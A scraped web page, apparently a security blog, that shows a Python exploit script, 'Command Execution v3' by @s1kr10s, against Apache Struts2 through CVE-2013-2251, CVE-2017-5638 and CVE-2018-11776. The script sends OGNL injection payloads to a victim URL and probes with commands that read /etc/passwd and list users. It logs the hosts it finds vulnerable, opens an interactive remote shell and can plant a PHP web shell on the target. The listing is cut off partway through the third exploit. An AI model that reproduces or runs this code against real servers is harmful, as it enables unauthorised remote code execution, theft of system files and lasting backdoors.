class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="exp-2" tabindex="-1"><a class="header-anchor" href="#exp-2" aria-hidden="true">#</a> EXP 2</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">from</span> future <span class="token keyword">import</span> standard_library
standard_library<span class="token punctuation">.</span>install_aliases<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">input</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">str</span>
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> readline
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

RED <span class="token operator">=</span> <span class="token string">&#39;\\033[1;31m&#39;</span>
BLUE <span class="token operator">=</span> <span class="token string">&#39;\\033[94m&#39;</span>
BOLD <span class="token operator">=</span> <span class="token string">&#39;\\033[1m&#39;</span>
GREEN <span class="token operator">=</span> <span class="token string">&#39;\\033[32m&#39;</span>
OTRO <span class="token operator">=</span> <span class="token string">&#39;\\033[36m&#39;</span>
YELLOW <span class="token operator">=</span> <span class="token string">&#39;\\033[33m&#39;</span>
ENDC <span class="token operator">=</span> <span class="token string">&#39;\\033[0m&#39;</span>

<span class="token keyword">def</span> <span class="token function">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;clear&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;cls&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">&#39;nt&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
cls<span class="token punctuation">(</span><span class="token punctuation">)</span>

logo <span class="token operator">=</span> BLUE<span class="token operator">+</span><span class="token triple-quoted-string string">&#39;&#39;&#39;
  ___   _____  ___    _   _  _____  ___
 (  _\`\\(_   _)|  _\`\\ ( ) ( )(_   _)(  _\`\\
 | (_(_) | |  | (_) )| | | |  | |  | (_(_)
 \`\\__ \\  | |  | ,  / | | | |  | |  \`\\__ \\
 ( )_) | | |  | |\\ \\ | (_) |  | |  ( )_) |
 \`\\____) (_)  (_) (_)(_____)  (_)  \`\\____)

        =[ Command Execution v3]=
              By @s1kr10s
&#39;&#39;&#39;</span><span class="token operator">+</span>ENDC
<span class="token keyword">print</span><span class="token punctuation">(</span>logo<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot; * Ejemplo: http(s)://www.victima.com/files.login\\n&quot;</span><span class="token punctuation">)</span>
host <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot; [+] HOST: &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> host<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;https://&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> host<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>

        poc <span class="token operator">=</span> <span class="token string">&quot;?redirect:\${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}&quot;</span>

        <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploit <span class="token operator">=</span> <span class="token string">&quot;?redirect:\${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{&quot;</span><span class="token operator">+</span>comando<span class="token operator">+</span><span class="token string">&quot;}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}&quot;</span>
            <span class="token keyword">return</span> exploit

        <span class="token keyword">def</span> <span class="token function">exploit2</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploit2 <span class="token operator">=</span> <span class="token string">&quot;Content-Type:%{(+++#_=&#39;multipart/form-data&#39;).(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell=&#39;&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&#39;).(+++#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(+++#shells=(+++#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#shell}:{&#39;/bin/sh&#39;,&#39;-c&#39;,#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}&quot;</span>
            <span class="token keyword">return</span> exploit2

        <span class="token keyword">def</span> <span class="token function">exploit3</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploit3 <span class="token operator">=</span> <span class="token string">&quot;%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&quot;</span><span class="token operator">+</span>comando<span class="token operator">+</span><span class="token string">&quot;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D&quot;</span>
            <span class="token keyword">return</span> exploit3

        <span class="token keyword">def</span> <span class="token function">pwnd</span><span class="token punctuation">(</span>shellfile<span class="token punctuation">)</span><span class="token punctuation">:</span>
            exploitfile <span class="token operator">=</span> <span class="token string">&quot;?redirect:\${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{&quot;</span><span class="token operator">+</span>shellfile<span class="token operator">+</span><span class="token string">&quot;}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}&quot;</span>
            <span class="token keyword">return</span> exploitfile

        <span class="token keyword">def</span> <span class="token function">validador</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            arr_lin_win <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;file%20/etc/passwd&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;dir&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;net%20users&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;/sbin/ifconfig&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;cat%20/etc/passwd&quot;</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> arr_lin_win

        <span class="token comment">#def reversepl(ip,port):</span>
        <span class="token comment">#       print &quot;perl&quot;</span>

        <span class="token comment">#def reversepy(ip,port):</span>
        <span class="token comment">#       print &quot;python&quot;</span>

        <span class="token comment"># CVE-2013-2251 ---------------------------------------------------------------------------------</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
            response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>poc<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot; Servidor no responde\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot;\\n [+] EJECUTANDO EXPLOIT CVE-2013-2251&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

        <span class="token keyword">if</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;mamalo&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot;   [-] VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
            owned <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;vulnsite.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span>
            owned<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
            owned<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

            opcion <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] RUN THIS EXPLOIT (s/n): &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
            <span class="token comment">#print BOLD+&quot;   * [SHELL REVERSA]&quot;+ENDC</span>
            <span class="token comment">#print OTRO+&quot;     Struts@Shell:$ reverse 127.0.0.1 4444 (perl,python,bash)\\n&quot;+ENDC</span>
            <span class="token keyword">if</span> opcion <span class="token operator">==</span> <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] GET PROMPT...\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot;   * [UPLOAD SHELL]&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>OTRO<span class="token operator">+</span><span class="token string">&quot;     Struts@Shell:$ pwnd (php)\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

                <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                    separador <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">&quot;Struts2@Shell_1:$ &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    espacio <span class="token operator">=</span> separador<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">)</span>
                    comando <span class="token operator">=</span> <span class="token string">&quot;&#39;,&#39;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>espacio<span class="token punctuation">)</span>

                    <span class="token keyword">if</span> espacio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&#39;reverse&#39;</span> <span class="token keyword">and</span> espacio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&#39;pwnd&#39;</span><span class="token punctuation">:</span>
                        shell <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>exploit<span class="token punctuation">(</span><span class="token string">&quot;&#39;&quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>comando<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&quot;&#39;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token operator">+</span>shell<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token keyword">elif</span> espacio<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&#39;pwnd&#39;</span><span class="token punctuation">:</span>
                        pathsave<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;path EJ:/tmp/: &quot;</span><span class="token punctuation">)</span>

                        <span class="token keyword">if</span> espacio<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&#39;php&#39;</span><span class="token punctuation">:</span>
                            shellfile <span class="token operator">=</span> <span class="token triple-quoted-string string">&quot;&quot;&quot;&#39;python&#39;,&#39;-c&#39;,&#39;f%3dopen(&quot;/tmp/status.php&quot;,&quot;w&quot;);f.write(&quot;&lt;?php%20system($_GET[ksujenenuhw])?&gt;&quot;)&#39;&quot;&quot;&quot;</span>
                            urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>pwnd<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>shellfile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                            shell <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>host<span class="token operator">+</span>exploit<span class="token punctuation">(</span><span class="token string">&quot;&#39;ls&#39;,&#39;-l&#39;,&#39;&quot;</span><span class="token operator">+</span>pathsave<span class="token operator">+</span><span class="token string">&quot;status.php&#39;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                            <span class="token keyword">if</span> shell<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span>pathsave<span class="token operator">+</span><span class="token string">&quot;status.php&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span>GREEN<span class="token operator">+</span><span class="token string">&quot;\\nCreate File Successfull :) [&quot;</span><span class="token operator">+</span>pathsave<span class="token operator">+</span><span class="token string">&quot;status.php]\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                            <span class="token keyword">else</span><span class="token punctuation">:</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span>RED<span class="token operator">+</span><span class="token string">&quot;\\nNo Create File :/\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>

        <span class="token comment"># CVE-2017-5638 ---------------------------------------------------------------------------------</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot; [+] EJECUTANDO EXPLOIT CVE-2017-5638&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        x <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> x <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            valida <span class="token operator">=</span> validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> exploit2<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>valida<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
                result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;ASCII&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;No such&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Directory of&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Volume Serial&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;inet&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;root:&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;uid=&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;accounts&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> result<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;Cuentas&quot;</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>RED<span class="token operator">+</span><span class="token string">&quot;   [-] VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    owned <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&#39;vulnsite.txt&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;a&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
                    owned<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

                    opcion <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] RUN THIS EXPLOIT (s/n): &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> opcion <span class="token operator">==</span> <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>YELLOW<span class="token operator">+</span><span class="token string">&quot;   [-] GET PROMPT...\\n&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

                        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
                            <span class="token keyword">try</span><span class="token punctuation">:</span>
                                separador <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>GREEN<span class="token operator">+</span><span class="token string">&quot;\\nStruts2@Shell_2:$ &quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
                                req <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>host<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> exploit2<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>separador<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
                                result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token operator">+</span>result<span class="token punctuation">)</span>
                            <span class="token keyword">except</span><span class="token punctuation">:</span>
                                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        x <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE &quot;</span><span class="token operator">+</span>ENDC <span class="token operator">+</span> <span class="token string">&quot;Payload: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span><span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
            x<span class="token operator">=</span>x<span class="token operator">+</span><span class="token number">1</span>

        <span class="token comment"># CVE-2018-11776 ---------------------------------------------------------------------------------</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BLUE<span class="token operator">+</span><span class="token string">&quot;     [-] NO VULNERABLE&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>BOLD<span class="token operator">+</span><span class="token string">&quot; [+] EJECUTANDO EXPLOIT CVE-2018-11776&quot;</span><span class="token operator">+</span>ENDC<span class="token punctuation">)</span>
        x <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> x <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#Filtramos la url solo dominio</span>
            url <span class="token operator">=</span> host<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;#&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%23&#39;</span><span class="token punctuation">)</span>
            url <span class="token operator">=</span> host<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39; &#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%20&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">&#39;://&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
                url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            scheme <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme
            site <span class="token operator">=</span> scheme <span class="token operator">+</span> <span class="token string">&#39;://&#39;</span> <span class="token operator">+</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc

            <span class="token comment">#Filtramos la url solo path</span>
            file_path <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>path
            <span class="token keyword">if</span> <span class="token punctuation">(</span>file_path <span class="token operator">==</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                file_path <span class="token operator">=</span> <span class="token string">&#39;/&#39;</span>

            valida <span class="token operator">=</span> validador<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                result <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>site<span class="token operator">+</span><span class="token string">&quot;/&quot;</span><span class="token operator">+</span>exploit3<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>valida<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>file_path<span class="token punctuation">)</span><span class="token punctuation">.</span>text

